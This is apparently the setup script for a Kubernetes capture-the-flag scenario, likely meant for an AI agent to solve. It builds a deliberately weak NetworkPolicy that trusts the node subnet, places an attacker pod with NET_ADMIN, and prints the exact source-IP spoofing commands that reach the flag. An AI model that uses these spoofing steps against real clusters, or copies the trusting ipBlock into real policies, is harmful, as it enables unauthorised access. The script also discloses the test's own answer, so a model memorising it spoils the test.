#!/bin/bash
set -euo pipefail
K8S_ID="prv-29"
CLUSTER_NAME="cve-prv-29-cni-spoof"
source "$(dirname "$0")/../../../scripts/k8s-common.sh"

echo "[PRV-29] CNI IP Spoofing Bypass"
k8s_init
k8s_create_cluster
k8s_install_calico
k8s_wait_ready
k8s_write_node_flag /host-flag
k8s_load_images alpine:latest nicolaka/netshoot:latest

# 白名单信任节点所在的二层网段；先钉一个 worker 作为验证节点
WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
ACCESS_NODE=$(echo "$WORKER_NODES" | head -1)
kubectl label "$ACCESS_NODE" cni-access=true --overwrite >/dev/null
NODE_IP=$(kubectl get "$ACCESS_NODE" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
ALLOWED_CIDR=$(python3 -c 'import ipaddress,sys; print(ipaddress.ip_network(sys.argv[1] + "/24", strict=False))' "$NODE_IP")
SPOOF_IP=$(python3 -c 'import ipaddress,sys; net=ipaddress.ip_network(sys.argv[1]); print(net.network_address + 250)' "$ALLOWED_CIDR")
echo "[PRV-29] access node: ${ACCESS_NODE} (${NODE_IP}), trusted CIDR: ${ALLOWED_CIDR}, spoof IP: ${SPOOF_IP}"

k8s_apply << YAML
apiVersion: v1
kind: Namespace
metadata:
  name: trust-zone
---
apiVersion: v1
kind: Namespace
metadata:
  name: untrust-zone
---
# flag 服务：只提供 /flag，进站策略只放行"节点地址网段"
apiVersion: v1
kind: Pod
metadata:
  name: flag-pod
  namespace: trust-zone
  labels:
    app: flag-pod
spec:
  containers:
    - name: server
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          printf 'flag{placeholder}\n' > /flag.txt
          while true; do
            printf "HTTP/1.1 200 OK\r\n\r\n\$(cat /flag.txt)" | nc -l -p 8080 -w 1
          done
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: flag-svc
  namespace: trust-zone
spec:
  type: NodePort
  selector:
    app: flag-pod
  ports:
    - port: 8080
      targetPort: 8080
      nodePort: 30808
---
# ipBlock 错误地信任整个节点二层网段；本场景验证 Pod 可伪造该网段源地址。
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ip-allowlist
  namespace: trust-zone
spec:
  podSelector:
    matchLabels:
      app: flag-pod
  policyTypes:
    - Ingress
  ingress:
    - from:
        - ipBlock:
            cidr: "${ALLOWED_CIDR}"
      ports:
        - port: 8080
---
# 落脚 pod：普通 Pod，但授予 NET_ADMIN 以执行源地址欺骗
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: untrust-zone
  labels:
    app: attacker
spec:
  nodeSelector:
    cni-access: "true"
  containers:
    - name: attacker
      image: nicolaka/netshoot:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      env:
        - name: NODE_IP
          valueFrom:
            fieldRef:
              fieldPath: status.hostIP
      securityContext:
        runAsUser: 0
        capabilities:
          add:
            - NET_ADMIN
YAML

k8s_wait_pod "flag-pod" "trust-zone"
k8s_wait_pod "attacker-pod" "untrust-zone"
sleep 5

# 为伪造地址建立回程路由到攻击者 Pod；这模拟 CNI 对该地址的转发路径。
ATTACKER_IP=$(kubectl get pod attacker-pod -n untrust-zone -o jsonpath='{.status.podIP}')
ACCESS_NODE_NAME="${ACCESS_NODE#node/}"
NODE_CONTAINER=$(docker ps --format '{{.Names}}' | awk -v expected="$ACCESS_NODE_NAME" '$0 == expected {print; exit}')
[ -n "$NODE_CONTAINER" ] || { echo "[PRV-29] ERROR: node container not found" >&2; exit 1; }
ATTACKER_VETH=$(docker exec "$NODE_CONTAINER" ip route get "$ATTACKER_IP" | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
[ -n "$ATTACKER_VETH" ] || { echo "[PRV-29] ERROR: attacker veth not found" >&2; exit 1; }
docker exec "$NODE_CONTAINER" ip route replace "${SPOOF_IP}/32" dev "$ATTACKER_VETH"

kubectl exec -n trust-zone flag-pod -- sh -c "printf '%s\n' '$FLAG' > /flag.txt"

k8s_publish_agent_identity exec-only untrust-zone attacker-pod
k8s_info
echo "    Flag in: flag-pod (trust-zone)，NetworkPolicy 只放行 ipBlock ${ALLOWED_CIDR}"
echo "    Flag service: flag-svc.trust-zone.svc.cluster.local:8080 / NodePort 30808"
echo ""
echo "    Exploit（在落脚 pod 内执行）："
echo "      ip addr add ${SPOOF_IP}/32 dev eth0"
echo "      ip route replace ${NODE_IP}/32 via 169.254.1.1 dev eth0 src ${SPOOF_IP}"
echo "      wget -qO- http://${NODE_IP}:30808/flag"
echo "    ipBlock 只检查源地址；攻击者伪造节点网段内地址即可穿过这条策略。"
